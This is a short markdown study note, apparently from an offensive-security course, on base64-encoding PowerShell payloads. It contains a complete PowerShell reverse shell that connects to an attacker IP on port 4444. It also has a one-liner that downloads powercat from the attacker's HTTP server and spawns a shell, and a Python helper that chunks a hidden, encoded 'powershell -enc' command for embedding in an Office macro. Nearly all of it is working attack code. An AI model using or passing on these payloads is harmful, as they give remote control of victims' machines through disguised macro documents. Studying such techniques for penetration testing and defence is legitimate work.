# base64_with_Powershell
- from 9.3.1 Common WebApp Attacks / Using executable files

```powershell

pwsh # start powershell in KALI terminal

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

- chapter 12.2.3, with powercat, downloading from our http server, and then, rev shell
```powershell

$Text = 'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.158/powercat.ps1");powercat -c 192.168.45.158 -p 4444 -e powershell'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

```

For MS Office Macro, the strings can't be longer than 255 characters, so we need to split them up, easy in with Python
```python
str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

that turns into 
```python
Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
Str = Str + "hAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5A"
Str = Str + "DIALgAxADYAOAAuADQANQAuADEANQA4AC8AcABvAHcAZQByAGM"
Str = Str + "AYQB0AC4AcABzADEAIgApADsAcABvAHcAZQByAGMAYQB0ACAAL"
Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA4ACAALQB"
Str = Str + "wACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsA"
Str = Str + "GwA"


```



- Easier on RevShells.com